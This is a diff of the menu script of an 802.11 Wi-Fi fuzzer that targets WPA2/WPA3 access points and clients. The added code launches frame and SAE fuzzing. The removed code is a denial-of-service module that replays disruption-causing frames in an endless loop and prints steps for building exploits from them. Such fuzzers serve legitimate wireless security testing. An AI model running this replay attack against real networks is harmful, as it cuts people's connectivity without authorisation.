@@ -1,185 +1,366 @@
-from scapy.all import sendp
-from fuzzer_init import *
-from Mngmt_frames.Construct_frame_fields import NUM_OF_FRAMES_TO_SEND
-from Msgs_colors import bcolors
+import subprocess
+from Mngmt_frames.Beacon import Beacon
+from Mngmt_frames.AssoReq import AssoReq
+from Mngmt_frames.AssoResp import AssoResp
+from Mngmt_frames.Authentication import Authentication
+from Mngmt_frames.Probe_request import ProbeReq
+from Mngmt_frames.Probe_response import Proberesp
+from Mngmt_frames.ReassoReq import ReassoReq
+from Mngmt_frames.ReassoResp import ReassoResp
 from Connection_monitors.DeauthMonitor import DeauthMon
 from Connection_monitors.AlivenessCheck import AllvCheck
-from ascii_art import dos_attack, wifi
-import os
-import codecs
-import subprocess
-import settings
+from Msgs_colors import bcolors
+from Ctrl_frames.ControlFrames import ControlFrames
+from Data_frames.DataFrames import DataFrames
+from fuzzer_init import *
 from time import sleep
+import threading
+import settings
+import sys
+import os
+import ascii_art
 
-    
-def nec_checks():
-    Aliveness = AllvCheck(targeted_STA, 'attacking')
-    Aliveness.start()
+
+print(ascii_art.logo)
+print('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n\n')
+print('\t\tThis tool is capable of fuzzing either any management, control or data frame of the 802.11\n\t\tprotocol or the SAE exchange. For the management, control or data frames, you can choose\n\t\teither the "standard" mode where all of the frames transmitted have valid size values or\n\t\tthe "random" mode where the size value is random. The SAE fuzzing operation requires an AP\n\t\tthat supports WPA3. Management, control or data frame fuzzing can be executed against any AP\n\t\t(WPA2 or WPA3). Finally, a DoS attack vector is implemented, which exploits the findings of\n\t\tthe management, control or data frames fuzzing.\n')
+print('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n\n')
+                            
+print('1) Fuzz Management Frames')
+print('2) Fuzz SAE exchange')
+print('3) Fuzz Control Frames')
+print('4) Fuzz Data Frames '+ bcolors.WARNING + '(BETA)' + bcolors.ENDC)
+print('5) DoS attack module\n\n')
+try:
+    choice = int(input('Enter a choice: '))
+except:
+    print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
+    os._exit(0)
+if choice == 1:
+    subprocess.call(['clear'], shell=True)
+    print(ascii_art.mngmt_frames) 
+    print('Type "standard" for the standard mode')
+    print('Type "random" for the random mode\n\n')
+    mode = input('Enter a choice: ').lower()
+    if mode == 'standard' or mode == 'random':
+        Aliveness = AllvCheck(targeted_STA, 'fuzzing')
+        Aliveness.start()
+        while not settings.retrieving_IP:
+            if settings.IP_not_alive:
+                os._exit(0)
+        sleep(10)
+        subprocess.call(['clear'], shell=True)
+    else:
+        print(bcolors.FAIL + '\nNo such mode :(' + bcolors.ENDC)
+        os._exit(0)
+    subprocess.call(['clear'], shell=True)
+    print(ascii_art.mngmt_frames)
+    print('Which frames would you like to fuzz?')
+    print('1) Beacon frames')
+    print('2) Probe request frames')
+    print('3) Probe response frames')
+    print('4) Association request frames')
+    print('5) Association response frames')
+    print('6) Reassociation request frames')
+    print('7) Reassociation response frames')
+    print('8) Authentication frames\n\n')
+    try:
+        choice2 = int(input('Select a frame to fuzz: '))
+    except:
+        print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
+        os._exit(0)
     Deauth_monitor = DeauthMon(targeted_AP, targeted_STA, att_interface)
     Deauth_monitor.start()
-
-
-def DoS_attack_init(file_list, mode, frames_dir):
-    chosen_files_list = []
-    frames_list = []
+    if choice2 == 1:
+        if mode == 'random':
+            subprocess.call(['clear'], shell=True)
+            print(ascii_art.beacon)        
+            print(ascii_art.wifi)
+            print("1) Target the STA and impersonate the AP")
+            print("2) Target the AP and impersonate the STA\n\n")
+            try:
+                direction = int(input('Select a frame to fuzz: '))
+            except:
+                print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
+                os._exit(0)
+            if direction in {1, 2}:
+                pass
+            else:
+                print(bcolors.FAIL + '\nNo such mode :(' + bcolors.ENDC)
+                os._exit(0)
+        else:
+            direction = 1
+        fuzz_beacons = Beacon(mode, "beacon", targeted_STA, targeted_AP, att_interface, real_ap_ssid, direction)
+        subprocess.call(['clear'], shell=True)
+        print(ascii_art.beacon)        
+        print(ascii_art.wifi)
+        print("Fasten your seatbelts and grab a coffee. Fuzzing is about to begin!")
+        sleep(5)
+        fuzz_beacons.fuzz_beacon()  
+    elif choice2 == 2:
+        fuzz_probe_reqs = ProbeReq(mode, "probe request", targeted_AP, targeted_STA, att_interface, real_ap_ssid)
+        subprocess.call(['clear'], shell=True)
+        print(ascii_art.probe_req)      
+        print(ascii_art.wifi)
+        print("Fasten your seatbelts and grab a coffee. Fuzzing is about to begin!")
+        sleep(5)
+        fuzz_probe_reqs.fuzz_probe_req()
+    elif choice2 == 3:
+        if mode == 'random':
+            subprocess.call(['clear'], shell=True)
+            print(ascii_art.probe_resp)        
+            print(ascii_art.wifi)
+            print("1) Target the STA and impersonate the AP")
+            print("2) Target the AP and impersonate the STA\n\n")
+            try:
+                direction = int(input('Select a frame to fuzz: '))
+            except:
+                print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
+                os._exit(0)
+            if direction in {1, 2}:
+                pass
+            else:
+                print(bcolors.FAIL + '\nNo such mode :(' + bcolors.ENDC)
+                os._exit(0)
+        else:
+            direction = 1
+        fuzz_probe_resp = Proberesp(mode, "probe response", targeted_STA, targeted_AP, att_interface, real_ap_ssid, direction)
+        subprocess.call(['clear'], shell=True)
+        print(ascii_art.probe_resp)    
+        print(ascii_art.wifi)
+        print("Fasten your seatbelts and grab a coffee. Fuzzing is about to begin!")
+        sleep(5)
+        fuzz_probe_resp.fuzz_probe_resp()
+    elif choice2 == 4:
+        fuzz_asso_reqs = AssoReq(mode, "association request", targeted_AP, targeted_STA, att_interface, real_ap_ssid)
+        subprocess.call(['clear'], shell=True)
+        print(ascii_art.asso_req)
+        print(ascii_art.wifi)
+        print("Fasten your seatbelts and grab a coffee. Fuzzing is about to begin!")
+        sleep(5)
+        fuzz_asso_reqs.fuzz_asso_req()
+    elif choice2 == 5:
+        if mode == 'random':
+            subprocess.call(['clear'], shell=True)
+            print(ascii_art.asso_resp)        
+            print(ascii_art.wifi)
+            print("1) Target the STA and impersonate the AP")
+            print("2) Target the AP and impersonate the STA\n\n")
+            try:
+                direction = int(input('Select a frame to fuzz: '))
+            except:
+                print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
+                os._exit(0)
+            if direction in {1, 2}:
+                pass
+            else:
+                print(bcolors.FAIL + '\nNo such mode :(' + bcolors.ENDC)
+                os._exit(0)
+        else:
+            direction = 1
+        fuzz_asso_resp = AssoResp(mode, "association response", targeted_STA, targeted_AP, att_interface, direction)
+        subprocess.call(['clear'], shell=True)
+        print(ascii_art.asso_resp)     
+        print(ascii_art.wifi)
+        print("Fasten your seatbelts and grab a coffee. Fuzzing is about to begin!")
+        sleep(5)
+        fuzz_asso_resp.fuzz_asso_resp()
+    elif choice2 == 6:
+        fuzz_reasso_reqs = ReassoReq(mode, "reassociation request", targeted_AP, targeted_STA, att_interface, real_ap_ssid)
+        subprocess.call(['clear'], shell=True)
+        print(ascii_art.reasso_req) 
+        print(ascii_art.wifi)
+        print("Fasten your seatbelts and grab a coffee. Fuzzing is about to begin!")
+        sleep(5)
+        fuzz_reasso_reqs.fuzz_reasso_req()
+    elif choice2 == 7:
+        if mode == 'random':
+            subprocess.call(['clear'], shell=True)
+            print(ascii_art.reasso_resp)        
+            print(ascii_art.wifi)
+            print("1) Target the STA and impersonate the AP")
+            print("2) Target the AP and impersonate the STA\n\n")
+            try:
+                direction = int(input('Select a frame to fuzz: '))
+            except:
+                print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
+                os._exit(0)
+            if direction in {1, 2}:
+                pass
+            else:
+                print(bcolors.FAIL + '\nNo such mode :(' + bcolors.ENDC)
+                os._exit(0)
+        else:
+            direction = 1
+        fuzz_asso_resp = ReassoResp(mode, "reassociation response", targeted_STA, targeted_AP, att_interface, direction)
+        subprocess.call(['clear'], shell=True)
+        print(ascii_art.reasso_resp)  
+        print(ascii_art.wifi)
+        print("Fasten your seatbelts and grab a coffee. Fuzzing is about to begin!")
+        sleep(5)
+        fuzz_asso_resp.fuzz_reasso_resp()
+    elif choice2 == 8:
+        fuzz_auth = Authentication(mode, "authentication", targeted_AP, targeted_STA, att_interface)
+        subprocess.call(['clear'], shell=True)
+        print(ascii_art.auth)  
+        print(ascii_art.wifi)
+        print("Fasten your seatbelts and grab a coffee. Fuzzing is about to begin!")
+        sleep(5)
+        fuzz_auth.fuzz_auth()
+elif choice == 2:
     subprocess.call(['clear'], shell=True)
-    print(dos_attack)
-    print('\n---------------------------------------------------------------------------------------------------------------------\n')
-    if mode == 1:
-        for file in file_list:
-            if 'Aliveness'in file:
-                chosen_files_list.append(file)
-            elif 'Deauth' in file: 
-                chosen_files_list.append(file)
-    elif mode == 2:
-        for file in file_list:
-            if 'till_disr' in file:
-                chosen_files_list.append(file)
+    subprocess.call(['sudo python3 dos-sae.py'], shell=True)
+elif choice == 3:
+    subprocess.call(['clear'], shell=True)
+    print(ascii_art.control_frames)
+    print('Type "standard" for the standard mode')
+    print('Type "random" for the random mode\n\n')
+    mode = input('Enter a choice: ').lower()
+    if mode == 'standard' or mode == 'random':
+        Aliveness = AllvCheck(targeted_STA, 'fuzzing')
+        Aliveness.start()
+        while not settings.retrieving_IP:
+            if settings.IP_not_alive:
+                os._exit(0)
+        sleep(10)
+        subprocess.call(['clear'], shell=True)
     else:
-        print(bcolors.FAIL + '\nNo relevant files found :(' + bcolors.ENDC)
+        print(bcolors.FAIL + '\nNo such mode :(' + bcolors.ENDC)
         os._exit(0)
-    for files in chosen_files_list:
-        with open(current_dir + frames_dir + files, 'r') as f:
-            for line in f:
-                if "frame = " in line:
-                    temp = line.strip("frame = \nb'")
-                    try:
-                        frames_list.append(temp.encode().decode('unicode_escape').encode("raw_unicode_escape"))
-                    except:
-                        pass
-    return frames_list
-    
-    
-def print_exploit(frame, frame_type):
-    if frame_type == 1:
-        print(bcolors.OKGREEN + "\n----You may got yourself an exploit----" + bcolors.ENDC)
-        print(f'\n{frame[32:]}\n')
-        print('Copy the above seed to the exploit.py file and replace it with the field ' + bcolors.OKBLUE + '{SEED}' + bcolors.ENDC)
-        subtype = int(int.from_bytes(frame[8:9], "big") / 16)
-        print('Replace ' + bcolors.OKBLUE + '{SUBTYPE} ' + bcolors.ENDC + f'with {subtype}')
-        print('\nAlso do the replacements:')
-        print(bcolors.OKBLUE + '{DESTINATION_MAC}' + bcolors.ENDC + ' = targeted_AP/targeted_STA, ' + bcolors.OKBLUE + '{SOURCE_MAC}' + bcolors.ENDC + ' = targeted_AP/targeted_STA, ' + bcolors.OKBLUE + '{AP_MAC}' + bcolors.ENDC + ' = targeted_AP')
-        print('\nFinally, replace' + bcolors.OKBLUE + ' {ATT_INTERFACE}' + bcolors.ENDC + ' with your WNIC attacking interface')
-        print(f'\nAfter the above replacements execute the exploit with: {bcolors.OKGREEN}sudo python3 exploit_mngmt.py{bcolors.ENDC}')
-        print(bcolors.OKGREEN + "\n----Use it with caution----\n" + bcolors.ENDC)
-        input(f"{bcolors.OKCYAN}Press enter to continue to the next seed: {bcolors.ENDC}\n")
+    subprocess.call(['clear'], shell=True)
+    print(ascii_art.control_frames)
+    print("1) Target the STA and impersonate the AP")
+    print("2) Target the AP and impersonate the STA\n\n")
+    try:
+        direction = int(input('Select a frame to fuzz: '))
+    except:
+        print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
+        os._exit(0)
+    if direction in {1, 2}:
+        pass
+    else:
+        print(bcolors.FAIL + '\nNo such mode :(' + bcolors.ENDC)
+        os._exit(0)
+    subprocess.call(['clear'], shell=True)
+    print(ascii_art.control_frames)
+    print('Which frames would you like to fuzz?')
+    print('1) Beamforming Report Poll')
+    print('2) VHT/HE NDP Announcement')
+    print('3) Control Frame Extension')
+    print('4) Control wrapper')
+    print('5) Block Ack Request (BAR)')
+    print('6) Block ACK')
+    print('7) PS-Poll (Power Save-Poll)')
+    print('8) RTS–Request to Send')
+    print('9) CTS-Clear to Send')
+    print('10) ACK')
+    print('11) CF-End (Contention Free-End)')
+    print('12) CF-End & CF-ACK\n\n')
+    try:
+        choice2 = int(input('Select a frame to fuzz: '))
+    except:
+        print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
+        os._exit(0)
+    if choice2 == 3:
         subprocess.call(['clear'], shell=True)
-    elif frame_type == 2:
-        print(bcolors.OKGREEN + "\n----You may got yourself an exploit----" + bcolors.ENDC)
-        subtype = int(int.from_bytes(frame[8:9], "big") / 16)
-        if subtype in {4,5,6}:
-             print(f'\n{frame[19:]}\n')
-        else:
-            print(f'\n{frame[25:]}\n')
-        print('Copy the above seed to the exploit.py file and replace it with the field ' + bcolors.OKBLUE + '{SEED}' + bcolors.ENDC)
-        print('Replace ' + bcolors.OKBLUE + '{SUBTYPE} ' + bcolors.ENDC + f'with {subtype}')
-        print('Replace ' + bcolors.OKBLUE + '{FCf} ' + bcolors.ENDC + 'with ' + f'{int.from_bytes(frame[9:10], "big")}')
-        print('\nAlso do the replacements:')
-        print(bcolors.OKBLUE + '{DESTINATION_MAC}' + bcolors.ENDC + ' = targeted_AP/targeted_STA, ' + bcolors.OKBLUE + '{SOURCE_MAC}' + bcolors.ENDC + ' = targeted_AP/targeted_STA')
-        print('\nFinally, replace' + bcolors.OKBLUE + ' {ATT_INTERFACE}' + bcolors.ENDC + ' with your WNIC attacking interface')
-        print(f'\nAfter the above replacements execute the exploit with: {bcolors.OKGREEN}sudo python3 exploit_ctrl.py{bcolors.ENDC}')
-        print(bcolors.OKGREEN + "\n----Use it with caution----\n" + bcolors.ENDC)
-        input(f"{bcolors.OKCYAN}Press enter to continue to the next seed: {bcolors.ENDC}\n")
-        subprocess.call(['clear'], shell=True)
-    elif frame_type == 3:
-        print(bcolors.OKGREEN + "\n----You may got yourself an exploit----" + bcolors.ENDC)
-        subtype = int(int.from_bytes(frame[8:9], "big") / 16)
-        if frame[32:38] == frame[18:24]:
-            print(f'\n{frame[38:]}\n')
-        else:
-            print(f'\n{frame[32:]}\n')     
-        print('Copy the above seed to the exploit.py file and replace it with the field ' + bcolors.OKBLUE + '{SEED}' + bcolors.ENDC)
-        print('Replace ' + bcolors.OKBLUE + '{SUBTYPE} ' + bcolors.ENDC + f'with {subtype}')
-        print('Replace ' + bcolors.OKBLUE + '{FCf} ' + bcolors.ENDC + 'with ' + f'{int.from_bytes(frame[9:10], "big")}')
-        print('Replace' + bcolors.OKBLUE + '{SC} ' + bcolors.ENDC + 'with ' + f'{int.from_bytes(frame[30:32], "big")}')
-        print('\nAlso do the replacements:')
-        print(bcolors.OKBLUE + '{DESTINATION_MAC}' + bcolors.ENDC + ' = targeted_AP/targeted_STA, ' + bcolors.OKBLUE + '{SOURCE_MAC}' + bcolors.ENDC + ' = targeted_AP/targeted_STA')
-        print('\nFinally, replace' + bcolors.OKBLUE + ' {ATT_INTERFACE}' + bcolors.ENDC + ' with your WNIC attacking interface')
-        print(f'\nAfter the above replacements execute the exploit with: {bcolors.OKGREEN}sudo python3 exploit_data.py{bcolors.ENDC}')
-        print(bcolors.OKGREEN + "\n----Use it with caution----\n" + bcolors.ENDC)
-        input(f"{bcolors.OKCYAN}Press enter to continue to the next seed: {bcolors.ENDC}\n")
-        subprocess.call(['clear'], shell=True)
-    
-def send_frames(frames_list, mode, frame_type):
-    counter = 0
-    if mode == 1:
+        print(ascii_art.control_frames)
+        print('Which frames would you like to fuzz?')
+        print('1) Poll')
+        print('2) Service period request')
+        print('3) Grant')
+        print('4) DMG CTS')
+        print('5) DMG DTS')
+        print('6) Grant Ack')
+        print('7) Sector sweep (SSW)')
+        print('8) Sector sweep feedback (SSW-Feedback)')
+        print('9) Sector sweep Ack (SSW-Ack)\n\n')        
         try:
-            num_of_frames = int(input('\nType the number of frames to transmit per seed: '))
+            choice3 = int(input('Select a frame to fuzz: '))
         except:
             print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
             os._exit(0)
-        for frame in frames_list:
-            print(f'Sending {num_of_frames} frames of the {counter + 1} seed..')
-            for _ in range(0, num_of_frames):
-                sendp(frame, count=16, iface=att_interface, verbose=0)
-                if not settings.is_alive:
-                    print_exploit(frame, frame_type)
-                    sleep(10)
-                    settings.is_alive = True
-                    settings.conn_loss = False
-                    break
-                elif settings.conn_loss:
-                    print_exploit(frame, frame_type)
-                    sleep(10)
-                    settings.is_alive = True
-                    settings.conn_loss = False      
-                    break
-            counter += 1        
-        print('\n' + bcolors.FAIL + 'No more seeds found in the fuzzer’s log files' + bcolors.ENDC)
-        print('Exiting attack!!')
-        os._exit(0)
-    elif mode == 2:
-        print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
-        print(bcolors.OKGREEN + "Launching the attack...." + bcolors.ENDC)
-        print(bcolors.OKGREEN + "Stop the attack with Ctrl+c" + bcolors.ENDC)
-        print('\n- - - - - - - - - - - - - - - - - - - - - - - \n')
-        while True:
-            for frame in frames_list:
-                sendp(frame, count=128, iface=att_interface, verbose=0)
+        if direction == 1:
+            fuzz_ctrl = ControlFrames(targeted_STA, targeted_AP, att_interface, mode, choice2, choice3 + 1)
+        else:
+            fuzz_ctrl = ControlFrames(targeted_AP, targeted_STA, att_interface, mode, choice2, choice3 + 1)
     else:
-        print(bcolors.FAIL + '\nNo such choice :(' + bcolors.ENDC)
+        if direction == 1:
+            fuzz_ctrl = ControlFrames(targeted_STA, targeted_AP, att_interface, mode, choice2, 0)
+        else:
+            fuzz_ctrl = ControlFrames(targeted_AP, targeted_STA, att_interface, mode, choice2, 0)
+    subprocess.call(['clear'], shell=True)
+    print(ascii_art.control_frames)
+    print(ascii_art.wifi)
+    print("Fasten your seatbelts and grab a coffee. Fuzzing is about to begin!")
+    sleep(5)
+    print(fuzz_ctrl.fuzz_ctrl_frames())
+elif choice == 4:
+    subprocess.call(['clear'], shell=True)
+    print(ascii_art.data_frames)
+    print('Type "standard" for the standard mode')
+    print('Type "random" for the random mode\n\n')
+    mode = input('Enter a choice: ').lower()
+    if mode == 'standard' or mode == 'random':
+        Aliveness = AllvCheck(targeted_STA, 'fuzzing')
+        Aliveness.start()
+        while not settings.retrieving_IP:
+            if settings.IP_not_alive:
+                os._exit(0)
+        sleep(10)
+        subprocess.call(['clear'], shell=True)
+    else:
+        print(bcolors.FAIL + '\nNo such mode :(' + bcolors.ENDC)
         os._exit(0)
-    
-
-print(dos_attack)
-print('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n\n')
-print('\t\tThis module launches a DoS attack based on the data (log files) collected from the fuzzing process.\n\t\tIt can only be performed against the same AP and STA used during the fuzzing process.\n\t\tNamely, the frames that caused any kind of problematic behavior during the fuzzing are being\n\t\ttransmitted in an endless loop.\n\n')
-print('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n\n')
-print('1) Frames detected at the moment of STA connectivity disruption, one-by-one')
-print('2) Sequence of frames till the moment a disruption was detected ' + bcolors.WARNING + '(BETA)' + bcolors.ENDC)
-try:
-    choice = int(input('Select the type of frames you wish to attack with: '))
-except:
-    print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
-    os._exit(0)
-subprocess.call(['clear'], shell=True)
-print(dos_attack)
-print('\n---------------------------------------------------------------------------------------------------------------------\n')
-print('1) Management Frames')
-print('2) Control Frames')
-print('3) Data Frames ' + bcolors.WARNING + '(BETA)' + bcolors.ENDC)
-try:
-    choice1 = int(input('Select the type of the frames: '))
-except:
-    print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
-    os._exit(0)
-current_dir = os.getcwd()
-if choice1 == 1:
-    file_list = os.listdir(current_dir + "/Logs/fuzz_mngmt_frames")
-    frames_dir = "/Logs/fuzz_mngmt_frames/"
-elif choice1 == 2:
-    file_list = os.listdir(current_dir + "/Logs/fuzz_ctrl_frames")
-    frames_dir = "/Logs/fuzz_ctrl_frames/"
-elif choice1 == 3:
-    file_list = os.listdir(current_dir + "/Logs/fuzz_data_frames")
-    frames_dir = "/Logs/fuzz_data_frames/"
+    subprocess.call(['clear'], shell=True)
+    print(ascii_art.data_frames)
+    print("1) Target the STA and impersonate the AP")
+    print("2) Target the AP and impersonate the STA\n\n")
+    try:
+        direction = int(input('Select a frame to fuzz: '))
+    except:
+        print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
+        os._exit(0)
+    if direction in {1, 2}:
+        pass
+    else:
+        print(bcolors.FAIL + '\nNo such mode :(' + bcolors.ENDC)
+        os._exit(0)
+    subprocess.call(['clear'], shell=True)
+    print(ascii_art.data_frames)
+    print('Which frames would you like to fuzz?')
+    print('1) Data')
+    print('2) Data + CF-ACK')
+    print('3) Data + CF-Poll')
+    print('4) Data + CF-Ack + CF-Poll')
+    print('5) Null Data')
+    print('6) CF-ACK (no data)')
+    print('7) CF-Poll (no data)')
+    print('8) CF-ACK + CF-Poll (no data)')
+    print('9) QoS Data')
+    print('10) QoS Data + CF-ACK')
+    print('11) QoS Data + CF-Poll')
+    print('12) QoS Data + CF-ACK + CF-Poll')
+    print('13) QoS Null Data')
+    print('14) Reserved Data Frame')
+    print('15) QoS Data + CF-Poll (no data)')
+    print('16) QoS CF-ACK + CF-Poll (no data)\n\n')
+    try:
+        choice2 = int(input('Select a frame to fuzz: '))
+    except:
+        print('\n' + bcolors.FAIL + 'Only integer inputs accepted' + bcolors.ENDC)
+        os._exit(0)
+    if direction == 1:
+        fuzz_data = DataFrames(targeted_STA, targeted_AP, att_interface, mode, choice2, True)
+    else:
+        fuzz_data = DataFrames(targeted_AP, targeted_STA, att_interface, mode, choice2, False)
+    subprocess.call(['clear'], shell=True)
+    print(ascii_art.data_frames)
+    print(ascii_art.wifi)
+    print("Fasten your seatbelts and grab a coffee. Fuzzing is about to begin!")
+    sleep(5)
+    print(fuzz_data.fuzz_data_frames())
+elif choice == 5:
+    subprocess.call(['clear'], shell=True)
+    subprocess.call(['sudo python3 mage.py'], shell=True)
 else:
     print(bcolors.FAIL + '\nNo such choice :(' + bcolors.ENDC)
-    os._exit(0)
-
-init_att = DoS_attack_init(file_list, choice, frames_dir)
-nec_checks()
-sleep(20)
-
-subprocess.call(['clear'], shell=True)
-send_frames(init_att, choice, choice1)
